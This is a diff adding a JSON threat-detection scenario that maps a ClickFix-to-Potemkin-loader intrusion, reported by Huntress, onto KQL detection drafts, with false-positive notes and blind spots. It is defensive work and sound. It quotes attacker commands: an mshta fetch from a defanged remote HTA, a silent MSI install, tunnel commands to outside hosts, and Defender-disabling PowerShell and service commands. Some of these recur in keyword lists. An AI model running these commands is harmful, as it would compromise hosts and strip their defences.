@@ -1,0 +1,308 @@
+{
+  "_meta": {
+    "schemaVersion": "scenario.v1",
+    "status": "factual-layer-complete · detection-layer-static-reviewed",
+    "author": "Matthias von Ehr",
+    "factsSource": "https://www.huntress.com/blog/potemkin-loader-rmmproject-clickfix-attack",
+    "factsSourceSecondary": "https://cybersecuritynews.com/hackers-use-clickfix-prompt-to-install-msi-package/",
+    "factsSourceNote": "Forensic facts (process chain, tooling, IOCs, timeline) extracted from the Huntress writeup by Anna Pham & Zach Rogers (published May 2026), corroborated by CyberSecurityNews (17 Jun 2026), and restated in own words. Huntress validates WHAT THE ATTACKER DID. It does NOT validate the KQL detections below - those are engineering, static-reviewed only.",
+    "maturityModel": {
+      "theorized": "Detection logic is plausible but untested.",
+      "static-reviewed": "KQL syntactically valid, Defender/Sentinel tables+columns exist, ATT&CK v19 mapping checked, FP/FN risk named. Done here. NOT proof it fires.",
+      "lab-tested": "Behavior emulated; query confirmed to fire and FP rate measured in a real tenant. YOURS to earn.",
+      "field-observed": "Detection has fired on this behavior in production. YOURS to earn."
+    },
+    "notes": [
+      "ATT&CK v19 remap: the Huntress-style 'Impair Defenses: Disable or Modify Tools' step maps to T1685 (Disable or Modify Tools, tactic Defense Impairment). The legacy T1562.001 no longer exists in the pinned v19.1 bundle - using it would fail scripts/check-mitre-bundle.ts.",
+      "v19 tactic note: T1218.005 (Mshta), T1218.007 (Msiexec) and T1620 (Reflective Code Loading) resolve to the 'Stealth' tactic in v19.1, not the older 'Defense Evasion'.",
+      "Hero detections resolve to real mapping_id entries in kql_mappings.json (KQL-T1204.004-001, KQL-T1218.005-002, KQL-T1547.001-003, KQL-T1685-003); the remaining steps ship kqlDraft only."
+    ]
+  },
+
+  "id": "clickfix-potemkin",
+  "title": "ClickFix -> Potemkin Loader -> Hands-on-Keyboard",
+  "source": {
+    "name": "Huntress",
+    "report": "Potemkin Loader & RMMProject: The Anatomy of a ClickFix Attack",
+    "url": "https://www.huntress.com/blog/potemkin-loader-rmmproject-clickfix-attack",
+    "published": "2026-05",
+    "intrusionDate": "2026"
+  },
+  "threat": "eCrime / access-to-ransomware (EtherRAT hands-on-keyboard endgame documented)",
+  "dwellTime": "~5h from ClickFix paste to EtherRAT deployment; domain controller reached in the same session",
+  "stack": ["Defender XDR", "Microsoft Sentinel"],
+  "maturityOverall": "static-reviewed",
+
+  "summary": "A user on a compromised website pastes a single copy-and-paste 'fix' command into the Run dialog. Through a LOLBin proxy chain (pcalua -> mshta -> msiexec) the Potemkin loader is silently installed, which then reflectively loads a credential-stealing module (RMMProject) entirely in memory. A human operator takes over, pulls in the blockchain-resolved EtherRAT backdoor, tunnels out through a renamed cloudflared, moves laterally to the domain controller and dismantles Defender step by step. The whole intrusion starts on one endpoint that had no monitoring agent - the single point where none of the signals below could ever have fired.",
+
+  "techniques": ["T1204.004", "T1218.005", "T1218.007", "T1547.001", "T1568.002", "T1620", "T1555.003", "T1539", "T1102.001", "T1572", "T1021.002", "T1047", "T1685"],
+
+  "steps": [
+    {
+      "order": 1,
+      "relTime": "T0",
+      "tactic": "Execution",
+      "technique": { "id": "T1204.004", "name": "Malicious Copy and Paste" },
+      "whatHappened": "On a compromised website the user is shown a fake verification step and told to paste a command into the Windows Run dialog (Win+R). The pasted one-liner is cmd /min /c \"pcalua.exe -a mshta.exe -c hxxps://cl.distritovagas[.]com/hte[.]hta\". In isolation this is a single user-initiated process launch - indistinguishable from any legitimate copy-paste. That is the whole problem: step 1 has no honest single-signal detection, which is why its detection here IS the whole-chain correlation.",
+      "detection": {
+        "tables": ["DeviceProcessEvents", "DeviceRegistryEvents"],
+        "kqlId": "KQL-T1204.004-001",
+        "kqlDraft": [
+          "// Hero correlation - ClickFix proxy chain + AppData Run-key + Defender tamper on ONE device within 30m.",
+          "let lookback = 3d;",
+          "let win = 30m;",
+          "let proxyChain = DeviceProcessEvents",
+          "    | where Timestamp > ago(lookback)",
+          "    | where InitiatingProcessFileName =~ \"pcalua.exe\" and FileName in~ (\"mshta.exe\", \"msiexec.exe\")",
+          "    | project DeviceId, ProxyTime = Timestamp, ProxyCmd = ProcessCommandLine;",
+          "let runKey = DeviceRegistryEvents",
+          "    | where Timestamp > ago(lookback)",
+          "    | where ActionType == \"RegistryValueSet\" and RegistryKey has \"CurrentVersion\" and RegistryKey has \"Run\"",
+          "    | where RegistryValueData has_any (\"AppData\", \"ProgramData\")",
+          "    | project DeviceId, KeyTime = Timestamp, RegistryValueData;",
+          "let defenderTamper = DeviceProcessEvents",
+          "    | where Timestamp > ago(lookback)",
+          "    | where ProcessCommandLine has_any (\"Set-MpPreference\", \"Add-MpPreference -ExclusionPath\", \"DisableRealtimeMonitoring\", \"Stop-Service WinDefend\")",
+          "    | project DeviceId, TamperTime = Timestamp, TamperCmd = ProcessCommandLine;",
+          "proxyChain",
+          "| join kind=inner runKey on DeviceId",
+          "| join kind=inner defenderTamper on DeviceId",
+          "| where abs(datetime_diff('minute', ProxyTime, KeyTime)) <= 30 and abs(datetime_diff('minute', ProxyTime, TamperTime)) <= 30",
+          "| project DeviceId, ProxyTime, ProxyCmd, KeyTime, RegistryValueData, TamperTime, TamperCmd, chain = \"ClickFix->Loader->DefenderTamper\""
+        ],
+        "maturity": "static-reviewed",
+        "fpNotes": "Thesis detection. Each leg alone is noisy - pcalua/mshta, Run-key writes and Set-MpPreference all occur in benign administration. The join on one DeviceId inside a 30m window is what makes it high-confidence. FN: if the operator spaces the legs beyond the window, widen it; the join is only as good as the telemetry - on an unmonitored endpoint (patient zero here) it never runs at all."
+      }
+    },
+    {
+      "order": 2,
+      "relTime": "T0 +seconds",
+      "tactic": "Stealth",
+      "technique": { "id": "T1218.005", "name": "Mshta", "secondary": [{ "id": "T1204.004", "name": "Malicious Copy and Paste" }] },
+      "whatHappened": "pcalua.exe (the Program Compatibility Assistant launcher, a signed Windows binary) is abused as a proxy to spawn mshta.exe, which fetches and executes the remote hte.hta from cl.distritovagas[.]com. Using pcalua as the parent breaks the naive 'explorer.exe -> mshta.exe' or 'browser -> mshta.exe' ancestry that most mshta rules key on.",
+      "detection": {
+        "tables": ["DeviceProcessEvents"],
+        "kqlId": "KQL-T1218.005-002",
+        "kqlDraft": [
+          "DeviceProcessEvents",
+          "| where Timestamp > ago(3d)",
+          "| where InitiatingProcessFileName =~ \"pcalua.exe\"",
+          "| where FileName in~ (\"mshta.exe\", \"msiexec.exe\")",
+          "| project Timestamp, DeviceName, DeviceId, AccountName, InitiatingProcessFileName, FileName, ProcessCommandLine, InitiatingProcessCommandLine",
+          "| sort by Timestamp asc"
+        ],
+        "maturity": "static-reviewed",
+        "fpNotes": "FP: pcalua legitimately launches installers in compatibility mode, but rarely mshta/msiexec pulling a remote resource. Key on the pcalua -> mshta|msiexec parent/child edge, not on mshta alone. Renaming mshta would evade the FileName match - corroborate with the remote HTA/MSI URL on the command line."
+      }
+    },
+    {
+      "order": 3,
+      "relTime": "T0 +minutes",
+      "tactic": "Stealth",
+      "technique": { "id": "T1218.007", "name": "Msiexec", "secondary": [{ "id": "T1218.005", "name": "Mshta" }] },
+      "whatHappened": "hte.hta uses curl to download sonra.eutialyson[.]com/inst24.msi and installs it silently with msiexec /qn. The MSI drops the Potemkin loader as RunSearch.exe into %LOCALAPPDATA%\\Microsoft\\RunSearch\\. Same detection object as step 2 - the pcalua-proxied chain is one behaviour, observed across mshta and msiexec.",
+      "detection": {
+        "tables": ["DeviceProcessEvents", "DeviceFileEvents"],
+        "kqlId": "KQL-T1218.005-002",
+        "kqlDraft": [
+          "DeviceProcessEvents",
+          "| where Timestamp > ago(3d)",
+          "| where InitiatingProcessFileName =~ \"pcalua.exe\"",
+          "| where FileName in~ (\"mshta.exe\", \"msiexec.exe\")",
+          "| project Timestamp, DeviceName, DeviceId, AccountName, InitiatingProcessFileName, FileName, ProcessCommandLine, InitiatingProcessCommandLine",
+          "| sort by Timestamp asc"
+        ],
+        "maturity": "static-reviewed",
+        "fpNotes": "FP: software distribution runs msiexec /qn constantly. The signal is msiexec launched via pcalua/mshta ancestry with a remote-fetched MSI, not msiexec itself. Pair with DeviceFileEvents for the RunSearch.exe drop under AppData\\Local as corroboration."
+      }
+    },
+    {
+      "order": 4,
+      "relTime": "T0 +minutes",
+      "tactic": "Persistence",
+      "technique": { "id": "T1547.001", "name": "Registry Run Keys / Startup Folder" },
+      "whatHappened": "The MSI's autostart component writes HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\RunSearch pointing at the dropped RunSearch.exe in AppData\\Local. Classic user-level Run-key persistence, but the value points into a per-user AppData path rather than Program Files.",
+      "detection": {
+        "tables": ["DeviceRegistryEvents"],
+        "kqlId": "KQL-T1547.001-003",
+        "kqlDraft": [
+          "DeviceRegistryEvents",
+          "| where Timestamp > ago(3d)",
+          "| where ActionType == \"RegistryValueSet\"",
+          "| where RegistryKey has \"CurrentVersion\" and RegistryKey has \"Run\"",
+          "| where RegistryValueData has_any (\"AppData\", \"ProgramData\") and RegistryValueData has \".exe\"",
+          "| project Timestamp, DeviceName, InitiatingProcessAccountName, RegistryKey, RegistryValueName, RegistryValueData, InitiatingProcessFileName"
+        ],
+        "maturity": "static-reviewed",
+        "fpNotes": "FP: plenty of legitimate apps (updaters, sync clients) auto-start from AppData. Medium-fidelity on its own; the value is as a correlation input (see step 1). Tighten by joining to a recent unsigned/AppData process creation on the same device."
+      }
+    },
+    {
+      "order": 5,
+      "relTime": "T0 -> +~5h (DGA probing)",
+      "tactic": "Command and Control",
+      "technique": { "id": "T1568.002", "name": "Domain Generation Algorithms" },
+      "whatHappened": "Potemkin generates 10,000 candidate domains from a hardcoded XorShift32 seed (151678) against a 1,000-word dictionary, producing three-word .xyz domains (e.g. anus-staylard[.]xyz). It probes each with GET /api/client_hello on 443 and treats a response containing 'ok' as its live C2. The deterministic seed means the domain set is identical across every infection.",
+      "detection": {
+        "tables": ["DeviceNetworkEvents"],
+        "kqlId": "dga-c2-domain-probing",
+        "kqlDraft": [
+          "DeviceNetworkEvents",
+          "| where Timestamp > ago(1d)",
+          "| where RemotePort == 443",
+          "| where InitiatingProcessFolderPath has \"AppData\"",
+          "| where RemoteUrl has \"/api/client_hello\" or RemoteUrl endswith \".xyz\"",
+          "| summarize attempts = count(), distinctDomains = dcount(RemoteUrl) by DeviceId, InitiatingProcessFileName, bin(Timestamp, 10m)",
+          "| where distinctDomains > 20"
+        ],
+        "maturity": "static-reviewed",
+        "fpNotes": "FN: the strongest DGA signal is a high NXDOMAIN rate, which DeviceNetworkEvents does not expose - this heuristic only sees the connections that resolve, so most of the 10,000-domain sweep is invisible here. Best paired with DNS telemetry (Sentinel DnsEvents) for the NXDOMAIN burst."
+      }
+    },
+    {
+      "order": 6,
+      "relTime": "T0 +~5h",
+      "tactic": "Stealth",
+      "technique": { "id": "T1620", "name": "Reflective Code Loading" },
+      "whatHappened": "Once C2 answers, Potemkin fetches the RMMProject module from /avast_update as a base64-encoded 4.4 MB x64 DLL, decodes it and maps it into its own memory with a custom reflective PE loader (no LoadLibrary call), invoking the export TLSDataStart. The stealer never touches disk as a loadable file.",
+      "detection": {
+        "tables": ["DeviceEvents", "DeviceProcessEvents"],
+        "kqlId": "reflective-load-amsi",
+        "kqlDraft": [
+          "DeviceEvents",
+          "| where Timestamp > ago(1d)",
+          "| where ActionType in (\"AmsiScan\", \"PowerShellCommand\", \"CreateRemoteThreadApiCall\")",
+          "| where InitiatingProcessFolderPath has \"AppData\"",
+          "| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessFolderPath, ActionType, AdditionalFields"
+        ],
+        "maturity": "static-reviewed",
+        "fpNotes": "BLIND SPOT: an in-memory reflective PE load leaves no file to scan and may leave no AMSI trace at all - file-based and signature detection run into the void. This query catches only the AMSI-visible or API-instrumented variant; the documented behaviour here would largely evade it. Detection realistically needs memory/behavioural telemetry (AMP, EDR memory scans)."
+      }
+    },
+    {
+      "order": 7,
+      "relTime": "T0 +~5h",
+      "tactic": "Credential Access",
+      "technique": { "id": "T1555.003", "name": "Credentials from Web Browsers", "secondary": [{ "id": "T1539", "name": "Steal Web Session Cookie" }] },
+      "whatHappened": "RMMProject steals credentials and cookies from Chrome, Edge and Firefox. For Chromium App-Bound Encryption it injects a 4,608-byte helper DLL into a headless browser process (CREATE_NO_WINDOW | DEBUG_ONLY_THIS_PROCESS), drives Chrome's IElevator COM interface to unwrap the ABE key, returns it over a named pipe, then decrypts the Cookies and Login Data SQLite stores with AES-GCM. Firefox keys are parsed from NSS (ASN.1, PBKDF2 + 3DES).",
+      "detection": {
+        "tables": ["DeviceProcessEvents", "DeviceFileEvents"],
+        "kqlId": "browser-abe-injection",
+        "kqlDraft": [
+          "DeviceProcessEvents",
+          "| where Timestamp > ago(1d)",
+          "| where FileName in~ (\"chrome.exe\", \"msedge.exe\")",
+          "| where ProcessCommandLine has_any (\"--headless\", \"--no-startup-window\") or InitiatingProcessFileName !in~ (\"explorer.exe\", \"chrome.exe\", \"msedge.exe\")",
+          "| where InitiatingProcessFolderPath has \"AppData\"",
+          "| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, FileName, ProcessCommandLine"
+        ],
+        "maturity": "static-reviewed",
+        "fpNotes": "FN: the ABE bypass injects INTO a legitimate browser, so a naive 'non-browser process opened Login Data' file-access rule misses it - the accessing process IS chrome/edge. Key instead on an AppData-resident process spawning a headless browser and injecting (CreateRemoteThread). FP: automation/testing that runs headless Chrome."
+      }
+    },
+    {
+      "order": 8,
+      "relTime": "T0 +~5h",
+      "tactic": "Command and Control",
+      "technique": { "id": "T1102.001", "name": "Dead Drop Resolver" },
+      "whatHappened": "EtherRAT (a Node.js backdoor) resolves its C2 address with EtherHiding: it queries an Ethereum smart contract (0xb3f2897f2bc797e5b9033faef8c81e92b01cb831) via eth_call through a rotating set of public RPC providers (Tenderly, Flashbots, MEV Blocker, BlastAPI, PublicNode, dRPC, Merkle). The contract returns an ABI-encoded C2 URL (at analysis time resumeacceptable[.]com). It persists under HKCU\\Run\\WindowsHost as a conhost-wrapped node.exe.",
+      "detection": {
+        "tables": ["DeviceNetworkEvents"],
+        "kqlId": "etherhiding-eth-rpc",
+        "kqlDraft": [
+          "DeviceNetworkEvents",
+          "| where Timestamp > ago(1d)",
+          "| where RemoteUrl has_any (\"tenderly\", \"flashbots\", \"mevblocker\", \"blastapi\", \"publicnode\", \"drpc.org\", \"merkle\")",
+          "| where InitiatingProcessFileName in~ (\"node.exe\", \"conhost.exe\")",
+          "| project Timestamp, DeviceName, InitiatingProcessFileName, RemoteUrl, RemoteIP, RemotePort"
+        ],
+        "maturity": "static-reviewed",
+        "fpNotes": "BLIND SPOT: the C2 address lives on the Ethereum blockchain, so domain takedowns and TI blocklists cannot pull it - the resolver just reads a new value from the contract. FP: legitimate web3/dev workloads talk to the same RPC providers. Detection has to key on node.exe/conhost from a persistence path talking to public Ethereum RPCs, not on any single domain."
+      }
+    },
+    {
+      "order": 9,
+      "relTime": "T0 +~5h",
+      "tactic": "Command and Control",
+      "technique": { "id": "T1572", "name": "Protocol Tunneling" },
+      "whatHappened": "The operator establishes egress tunnels. cloudflared is renamed to svchost.exe and launched as conhost --headless \"svchost.exe\" tunnel --url http://127.0.0.1:31024 --protocol http2, writing to %TEMP%\\cloudflared\\cloudflared_tunnel.log. A Chisel client also opens a reverse SOCKS tunnel to 213.165.41[.]26:22603.",
+      "detection": {
+        "tables": ["DeviceProcessEvents", "DeviceNetworkEvents"],
+        "kqlId": "renamed-cloudflared-tunnel",
+        "kqlDraft": [
+          "DeviceProcessEvents",
+          "| where Timestamp > ago(1d)",
+          "| where ProcessCommandLine has \"tunnel\" and ProcessCommandLine has \"--url\" and ProcessCommandLine has \"--protocol\"",
+          "| where FileName !in~ (\"cloudflared.exe\")",
+          "| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName"
+        ],
+        "maturity": "static-reviewed",
+        "fpNotes": "BLIND SPOT: cloudflared is renamed to svchost.exe, so any name-based blocklist is defeated. The tell is the argument pattern (tunnel --url http://127.0.0.1:<port> --protocol http2) regardless of the binary name - which is exactly what this query keys on. FP: sanctioned Cloudflare Tunnel deployments; allowlist their known hosts."
+      }
+    },
+    {
+      "order": 10,
+      "relTime": "T0 +~5-6h",
+      "tactic": "Lateral Movement",
+      "technique": { "id": "T1021.002", "name": "SMB/Windows Admin Shares", "secondary": [{ "id": "T1047", "name": "Windows Management Instrumentation" }] },
+      "whatHappened": "Hands-on-keyboard lateral movement to the domain controller uses Impacket-style WMIExec and SMBExec. WMIExec runs recon under DOMAIN\\Administrator (cmd /Q /c whoami /groups | findstr /i admin redirected to \\Windows\\Temp; WinRM Event ID 91). SMBExec drops a randomly-named .bat in C:\\Windows\\TEMP, executes it and writes output to the target's C$ share, staging a follow-on MSI (EGGjVyW9Uloz.msi) from the attacker's ADMIN$\\Temp share on 77.110.122[.]58.",
+      "detection": {
+        "tables": ["DeviceProcessEvents", "DeviceNetworkEvents"],
+        "kqlId": "wmiexec-smbexec-dc",
+        "kqlDraft": [
+          "DeviceProcessEvents",
+          "| where Timestamp > ago(1d)",
+          "| where InitiatingProcessFileName in~ (\"wmiprvse.exe\", \"services.exe\")",
+          "| where FileName =~ \"cmd.exe\"",
+          "| where ProcessCommandLine has \"/Q\" and ProcessCommandLine has \"/c\"",
+          "| where ProcessCommandLine has_any (\"Windows\\\\Temp\", \"findstr\", \"C$\", \"echo\")",
+          "| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, ProcessCommandLine",
+          "| sort by Timestamp asc"
+        ],
+        "maturity": "static-reviewed",
+        "fpNotes": "FP: legitimate remote administration and management tooling also drive WMI/SMB. The Impacket signature is wmiprvse/services spawning cmd /Q /c with a \\Windows\\Temp\\<random> redirect and C$/ADMIN$ output staging. Highest value when the target is a domain controller."
+      }
+    },
+    {
+      "order": 11,
+      "relTime": "T0 +~5-6h",
+      "tactic": "Defense Impairment",
+      "technique": { "id": "T1685", "name": "Disable or Modify Tools" },
+      "whatHappened": "Defender is dismantled in stages: an in-memory AMSI patch (overwriting amsiContext with E_INVALIDARG / 0x80070057), a batch of Set-MpPreference toggles (-DisableRealtimeMonitoring, -DisableIOAVProtection, -DisableBehaviorMonitoring, -DisableScriptScanning, -MAPSReporting Disabled), the matching registry policy disables (DisableAntiSpyware, DisableRealtimeMonitoring, ...), an exclusion (Add-MpPreference -ExclusionPath C:\\ProgramData\\p), and finally service kills (Stop-Service WinDefend -Force; sc.exe config WinDefend start= disabled; Stop-Service wscsvc; Stop-Service SecurityHealthService).",
+      "detection": {
+        "tables": ["DeviceProcessEvents", "DeviceRegistryEvents"],
+        "kqlId": "KQL-T1685-003",
+        "kqlDraft": [
+          "DeviceProcessEvents",
+          "| where Timestamp > ago(3d)",
+          "| where ProcessCommandLine has_any (",
+          "    \"Set-MpPreference\", \"Add-MpPreference -ExclusionPath\",",
+          "    \"DisableRealtimeMonitoring\", \"DisableIOAVProtection\", \"DisableBehaviorMonitoring\", \"DisableScriptScanning\",",
+          "    \"Stop-Service WinDefend\", \"config WinDefend start= disabled\", \"Stop-Service wscsvc\", \"Stop-Service SecurityHealthService\")",
+          "| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName",
+          "| sort by Timestamp asc"
+        ],
+        "maturity": "static-reviewed",
+        "fpNotes": "FP: AV migrations and IT maintenance legitimately touch these controls. The tradecraft tell is the SEQUENCE - AMSI patch, then Set-MpPreference toggles, then service stop/disable - on one host in minutes, ideally right after an AppData-resident process appeared. FN: the AMSI patch itself is in-memory and not on the command line, so this catches the noisier PowerShell/sc.exe legs, not the patch."
+      }
+    }
+  ],
+
+  "correlation": {
+    "linkingEntity": "DeviceId (single host, process ancestry) - escalate to AccountSid once the operator moves laterally",
+    "timeWindow": "30m sliding on-device; 6h for the cross-host operator phase",
+    "inputs": 3,
+    "output": "1 high-confidence incident",
+    "sequence": ["ClickFix paste (T1204.004)", "pcalua -> mshta -> msiexec (T1218.005/.007)", "AppData Run-key (T1547.001)", "reflective RMMProject load (T1620)", "Defender teardown (T1685)"],
+    "narrative": "Detection isn't a query, it's a chain. Every primitive here is individually defensible: pcalua launches an installer, mshta and msiexec are signed LOLBins, a Run-key write points at AppData like a hundred legitimate updaters, and Set-MpPreference gets run during real maintenance. None of them warrants a page alone. Joined on the same DeviceId inside a 30m window, the ordered sequence - proxy-chain execution, AppData persistence, and Defender tampering - does not occur in benign operations. The fidelity is created by the join, not by any single query. The hero rule (KQL-T1204.004-001) fuses the proxy-chain leg (KQL-T1218.005-002), the persistence leg (KQL-T1547.001-003) and the Defender-tamper leg (KQL-T1685-003) into one detection.",
+    "architectNote": "Decide which layer owns this: a Defender XDR custom detection scoped to DeviceId is the natural home for the on-device 30m correlation, while the cross-host operator phase (lateral movement to the DC, Chisel/cloudflared tunnels) belongs in a Sentinel scheduled analytics rule keyed on the AccountSid once identity is in play. The uncomfortable truth this scenario exists to make: the entire correlation is worthless on the endpoint where it mattered most, because patient zero had no agent. Coverage was org-wide available but not effective on that host."
+  },
+
+  "blindSpots": [
+    "Unmonitored endpoint: coverage existed org-wide but was not effective on patient zero - the host had no monitoring agent, so every on-device detection above simply never ran. The whole intrusion started there.",
+    "Blockchain C2 (EtherRAT / EtherHiding): the C2 address is read from an Ethereum smart contract, so domain takedowns and TI blocklists have nothing to block - the resolver just fetches the next value on-chain.",
+    "Reflective in-memory loading: RMMProject is mapped into memory with a custom PE loader and never written as a loadable file, so file-based and signature detection run into the void.",
+    "Renamed cloudflared: the tunnel binary is renamed to svchost.exe, defeating any name-based blocklist - detection has to key on the tunnel argument pattern and destination behaviour, not the filename.",
+    "AMSI patch is in-memory: the amsiContext overwrite never appears on a command line, so the Defender-tamper detection sees the noisier PowerShell/sc.exe legs but not the patch itself."
+  ]
+}
